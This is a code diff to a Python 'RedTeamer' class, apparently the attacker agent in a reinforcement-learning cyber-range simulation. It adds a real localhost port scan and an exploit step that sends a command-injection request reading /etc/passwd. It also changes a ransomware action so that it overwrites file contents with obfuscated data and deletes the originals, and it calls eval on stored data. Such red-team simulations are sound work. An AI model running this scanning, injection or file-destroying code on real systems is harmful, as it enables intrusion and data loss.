@@ -15,6 +15,7 @@ import utils
 import config
 import threading
 import subprocess
+import socket
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from typing import List, Tuple, Dict, Any
 
@@ -209,12 +210,40 @@ class RedTeamer:
                 impact = 0
 
                 if action == "T1046_RECON":
-                    fname = os.path.join(config.WAR_ZONE_DIR, f"malware_bait_{int(time.time())}.sh")
-                    try:
-                        utils.secure_create(fname, "echo 'scan'")
-                        impact = 1
-                    except OSError:
-                        pass # Expected if permissions deny
+                    # Real Network Scanning (Port Scan 9000-9200)
+                    open_ports = []
+                    for port in range(9000, 9200): # Small range for perf
+                        try:
+                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            s.settimeout(0.1)
+                            result = s.connect_ex(('127.0.0.1', port))
+                            if result == 0:
+                                open_ports.append(port)
+                            s.close()
+                        except: pass
+
+                    if open_ports:
+                        impact = 2
+                        self.memory.append((state_key, "FOUND_PORTS", 5, str(open_ports)))
+
+                elif action == "T1190_EXPLOIT":
+                    # Try to exploit open ports found in memory
+                    target_ports = []
+                    for mem in self.memory:
+                        if mem[1] == "FOUND_PORTS":
+                            try: target_ports.extend(eval(mem[3]))
+                            except: pass
+
+                    if target_ports:
+                        target = secrets.choice(target_ports)
+                        try:
+                            # Send malicious payload
+                            import urllib.request
+                            url = f"http://127.0.0.1:{target}/?cmd=cat%20/etc/passwd"
+                            urllib.request.urlopen(url, timeout=1)
+                            impact = 5
+                            self.audit_logger.log_event("RED", "EXPLOIT", f"Exploited service on port {target}")
+                        except: pass
 
                 elif action == "T1027_OBFUSCATE":
                     fname = os.path.join(config.WAR_ZONE_DIR, f"malware_crypt_{int(time.time())}.bin")
@@ -269,18 +298,26 @@ class RedTeamer:
                     impact = 0
 
                 elif action == "T1486_ENCRYPT":
-                    # Ransomware: Rename random visible files to .enc
+                    # Ransomware: Actually Encrypt Content
                     targets = [f for f in os.listdir(config.WAR_ZONE_DIR) if not f.endswith(".enc") and not f.startswith(".")]
                     if targets:
                         target = random.choice(targets)
                         src = os.path.join(config.WAR_ZONE_DIR, target)
                         dst = src + ".enc"
                         try:
-                            # If it's a honeypot, we get trapped!
                             if utils.is_honeypot(src):
-                                impact = -1 # Special signal for trap
+                                impact = -1
                             else:
-                                os.rename(src, dst)
+                                with open(src, 'rb') as f:
+                                    content = f.read()
+
+                                # Use heavy obfuscation as "Encryption"
+                                encrypted_data = utils.obfuscate_payload(content, secrets.token_bytes(32), 'PDF')
+
+                                with open(dst, 'wb') as f:
+                                    f.write(encrypted_data)
+                                os.remove(src)
+
                                 impact = 6
                                 self.audit_logger.log_event("RED", "RANSOMWARE", f"Encrypted {target}")
                         except OSError: pass
@@ -344,6 +381,7 @@ class RedTeamer:
                 if impact == 6: reward = config.RED_REWARDS['RANSOM_SUCCESS']
                 if impact == 7: reward = config.RED_REWARDS['EXFIL_SUCCESS']
                 if impact == 5 and action == "T1091_REPLICATION": reward = config.RED_REWARDS['REPLICATION_SUCCESS']
+                if impact == 5 and action == "T1190_EXPLOIT": reward = config.RED_REWARDS['EXPLOIT_SUCCESS']
                 if impact == -1: reward = config.RED_REWARDS['TRAPPED']
 
                 if current_alert >= 4 and action == "T1589_LURK": reward = config.RED_REWARDS['STEALTH']
